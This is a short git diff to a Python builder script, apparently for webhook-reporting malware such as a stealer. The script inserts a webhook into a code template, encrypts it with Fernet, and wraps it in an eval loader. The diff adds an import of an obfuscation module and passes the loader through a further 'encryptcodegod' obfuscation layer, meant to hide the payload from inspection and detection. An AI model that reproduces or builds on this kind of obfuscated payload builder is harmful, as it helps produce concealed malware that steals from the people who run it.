@@ -5,6 +5,7 @@ from cryptography.fernet import Fernet
 from argparse import ArgumentParser, Namespace
 from subprocess import run, PIPE
 from colorama import Fore, Style
+from code.obf import *
 
 ly = Fore.LIGHTYELLOW_EX
 oa = Fore.LIGHTMAGENTA_EX
@@ -51,7 +52,7 @@ def build(webhook: str, out_file: str, debug: bool):
     libs = code[0:index] + "\nfrom cryptography.fernet import Fernet\n"
     content = code[index:-1].replace("{WEBHOOK}", str(webhook))
     encrypted_content = Fernet(fernet_key).encrypt(content.encode())
-    eval_code = f"\ncode = Fernet('{fernet_key}').decrypt({encrypted_content}).decode();eval(compile(code, '<string>', 'exec'))"
+    eval_code = encryptcodegod(f"\ncode = Fernet('{fernet_key}').decrypt({encrypted_content}).decode();eval(compile(code, '<string>', 'exec'))")
 
     with open(of, 'w') as build_file:
         build_file.write(libs)
